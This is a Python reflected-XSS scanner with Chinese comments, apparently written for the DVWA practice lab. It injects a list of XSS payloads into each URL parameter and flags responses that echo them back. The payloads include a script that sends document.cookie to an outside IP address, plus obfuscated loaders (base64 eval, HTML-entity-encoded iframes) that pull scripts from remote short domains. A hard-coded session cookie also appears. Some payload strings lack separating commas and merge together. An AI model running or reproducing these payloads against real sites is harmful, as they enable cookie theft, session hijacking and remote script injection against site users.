import requests

payloads = [
    '<script>document.location="http://172.21.169.70:8080/cookie?cookie="+document.cookie</script>'
    '<sCriPt>document.location="http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name="+document.cookie</ScRIpt>'
    '<ScRI<sCriPt>pT>document.location="http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name="+document.cookie</ScRI</sCriPt>pT>'
    '<script>alert(document.cookie)</script>',
    '<Img sRC=https://i0.al/GwPQp.jpg>',
    '<svg onload=alert(1)>',
    '<sCRiPt sRC=//i0.al/GwPQ></sCrIpT>',
    "<img src=x onerror=eval(atob("
    "'cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovLzB4LmF4L0d3UFE"
    "/JytNYXRoLnJhbmRvbSgp'))>",
    '<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34'
    ';&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#71;&#119;&#80;&#81;&#34;&#62'
    ';&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>',
    '<sCRiPt/SrC=//0x.ax/GwPQ>',
    '</script>"><script>prompt(1)</script>',
    '</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>',
    '"><img src=x onerror=prompt(1)>',
    '"><iframe/src=javascript:prompt(1)>',
    '"><h1 onclick=prompt(1)>Clickme</h1>',
    '"><a href=javascript:prompt(1)>Clickme</a>',
    '"><a href="javascript:confirm%28 1%29">Clickme</a>',
    '"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>',
    '"><textarea autofocus onfocus=prompt(1)>',
    '"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>',
    '"><script>co\u006efir\u006d`1`</script>',
    '"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>',
    '"><img src=x onerror=co\u006efir\u006d`1`>',
    '"><svg/onload=co\u006efir\u006d`1`>',
    '"><iframe/src=javascript:co\u006efir\u006d%28 1%29>',
    '"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>',
    '"><a href=javascript:prompt%28 1%29>Clickme</a>',
    '"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>',
    '"><textarea autofocus onfocus=co\u006efir\u006d(1)>',
    '"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome',
    '"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme',
    '"><img/src=x%0Aonerror=prompt`1`>',
    '"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">',
    '"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>'

]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Cookie": "security=low; PHPSESSID=b171pc6qicumo686s83fqfe6t5"
}


# 搜索HTTP目标对XSS攻击的脆弱性
class spider():
    def __init__(self):
        self._url = ""

    def scan(self, url):
        urls = urlsplit(url)
        if urls is None:
            return False
        print("\r[+] 正在扫描XSS漏洞......")
        for url in urls:
            for payload in payloads:
                try:
                    _url = url.format(payload=payload)
                    r = requests.get(_url, headers=headers, timeout=5)
                    if r.status_code != 200:
                        break
                    res = r.text
                    if res is None:
                        return False
                    if payload in res:
                        print("[*] 存在XSS漏洞: ", _url)
                except:
                    pass

        return False


# url拆分
def urlsplit(url):
    domain, params = url.split("?")
    urls = []
    for name, value in [p.split("=") for p in params.split("&")]:
        new_url = f"{domain}?{name}={{payload}}"
        urls.append(new_url)
    return urls


def main():
    while True:
        print("[INFO] 输入示例：http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name=admin#")
        url = input('[INPUT] 输入url(输入0返回上一级): ')
        if url == '0':
            break
        # url = 'http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name=admin&pwd=password'
        else:
            spi = spider()
            spi.scan(url)
        print(f"[INFO] 网站'{url}'检测完毕。")


# if __name__ == '__main__':
#     main()

"""
http://127.0.0.1/DVWA-master/vulnerabilities/xss_r/?name=admin#
"""
